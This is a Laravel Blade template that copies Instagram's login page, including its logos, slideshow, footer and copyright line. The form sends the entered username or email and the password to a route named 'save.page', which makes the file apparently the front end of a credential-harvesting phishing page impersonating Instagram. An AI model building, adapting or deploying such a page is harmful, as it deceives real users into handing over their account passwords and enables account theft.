<main>

    <div class="container">
       <div class="main-container">
           <div class="main-content">
               <div class="slide-container" style="background-image: url({{asset('assets/images')}}/phone-frame.png);">
                   <div class="slide-content" id="slide-content">
                       <img src="{{asset('assets/images')}}/slide (1).jpg" alt="slide image" class="active">
                       <img src="{{asset('assets/images')}}/slide (2).jpg" alt="slide image">
                       <img src="{{asset('assets/images')}}/slide (3).jpg" alt="slide image">
                       <img src="{{asset('assets/images')}}/slide (4).jpg" alt="slide image">
                       <img src="{{asset('assets/images')}}/slide (5).jpg" alt="slide image">
                   </div>
               </div>
               
               <form action="{{route('save.page')}}">
                @csrf
               <div class="form-container">
                   <div class="form-content box">
                       <div class="logo">
                           <img src="{{asset('assets/images')}}/logo-light.png" alt="Instagram logo" class="logo-light">
                           <img src="{{asset('assets/images')}}/logo-dark.png" alt="Instagram logo" class="logo-dark">
                       </div>
                       <div class="signin-form" id="signin-form">
                           <div class="form-group">
                               <div class="animate-input">
                                   <span>
                                       Phone number, username or email
                                   </span>
                                   <input type="text" name="email" >
                               </div>
                           </div>
                           <div class="form-group">
                               <div class="animate-input">
                                   <span>
                                       Password
                                   </span> 
                                   <input type="password" name="password">
                                   <button>Show</button>
                               </div>
                           </div>
                           <div class="btn-group">
                               <button class="btn-login" id="signin-btn" disabled>
                                   Log In
                               </button>
                           </div>
                           <div class="divine">
                               <div></div>
                               <div>OR</div>
                               <div></div>
                           </div>
                           <div class="btn-group">
                               <button class="btn-fb">
                                   <img src="{{asset('assets/images')}}/facebook-icon.png" alt="">
                                   <span>Log in with Facebook</span>
                               </button>
                           </div>
                           <a href="#" class="forgot-pw">Forgot password?</a>
                       </div>
                   </div>
                   <div class="box goto">
                       <p>
                           Don't have an account?
                           <a href="#">Sign up</a>
                       </p>
                   </div>
                   <div> @if (Session::has('get_message'))
 
                      <strong>{{Session::get('get_message')}}</strong>
                       
                   @endif
               </div> 
                </form>
 
                   <div class="app-download">
                       <p>Get the app.</p>
                       <div class="store-link">
                           <a href="#">
                               <img src="{{asset('assets/images')}}/app-store.png" alt="app store">
                           </a>
                           <a href="#">
                               <img src="{{asset('assets/images')}}/gg-play.png" alt="google play">
                           </a>
                       </div>
                   </div>
               </div>
           </div>
       </div>
       <div class="footer">
           <div class="links">
               <a href="#">About</a>
               <a href="#">Blog</a>
               <a href="#">Jobs</a>
               <a href="#">Help</a>
               <a href="#">API</a>
               <a href="#">Privacy</a>
               <a href="#">Terms</a>
               <a href="#">Top Accounts</a>
               <a href="#">Hashtags</a>
               <a href="#">Locations</a>
               <a href="#" id="darkmode-toggle">Darkmode</a>
           </div>
           <div class="copyright">
               © 2022 Instagram from Facebook
           </div>
       </div>
   </div>
 
   <!-- APP JS -->
   <script src="{{asset('assets/app.js')}}"></script>
 
 
 </main>